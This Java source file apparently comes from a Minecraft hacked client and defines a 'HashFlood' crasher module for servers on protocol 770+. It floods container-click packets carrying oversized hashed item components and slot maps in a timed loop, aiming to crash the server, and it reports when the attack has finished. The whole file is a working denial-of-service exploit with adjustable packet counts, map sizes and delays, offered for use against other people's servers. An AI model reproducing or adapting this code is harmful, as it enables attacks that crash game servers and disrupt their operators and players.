package me.dannycrasher.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.objects.HashStack;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class HashFloodCrash extends Module {
	private ScheduledExecutorService executorService;

	public HashFloodCrash() {
		super("HashFlood", "Aggressive hashed slot-map flood (protocol 770+ / 1.21.5+)", ModuleType.CRASHER);
		addArgument("packets", ArgumentType.INT, 1, 5000, "500");
		addArgument("mapSize", ArgumentType.INT, 1, 4096, "512");
		addArgument("compSize", ArgumentType.INT, 1, 65536, "2048");
		addArgument("delCompSize", ArgumentType.INT, 1, 65536, "2048");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "100");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		if (!Protocol.HASHED_ITEM_PROTOCOLS.contains(protocol)) {
			context.sendMessage("<red>HashFlood requires protocol 770+ (1.21.5). Current: <aqua>" + protocol);
			return;
		}

		int packets = context.getInt("packets");
		int mapSize = context.getInt("mapSize");
		int compSize = context.getInt("compSize");
		int delCompSize = context.getInt("delCompSize");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		HashStack hashStack = new HashStack(compSize, delCompSize);

		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		setEnabled(true);
		context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		executorService = Executors.newSingleThreadScheduledExecutor();
		executorService.scheduleAtFixedRate(() -> {
			if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executorService.shutdown();
				setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				PacketCodec.sendPacket(new PacketContainerClick(
						protocol,
						0,
						1,
						10,
						PacketContainerClick.ContainerActionType.CLICK_ITEM,
						PacketContainerClick.ContainerAction.RIGHT_CLICK,
						hashStack,
						mapSize
				), packets);
			}
			check.getAndIncrement();
		}, 0, threadSleep, TimeUnit.MILLISECONDS);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		ClickCrashRunner.shutdown(executorService);
	}
}
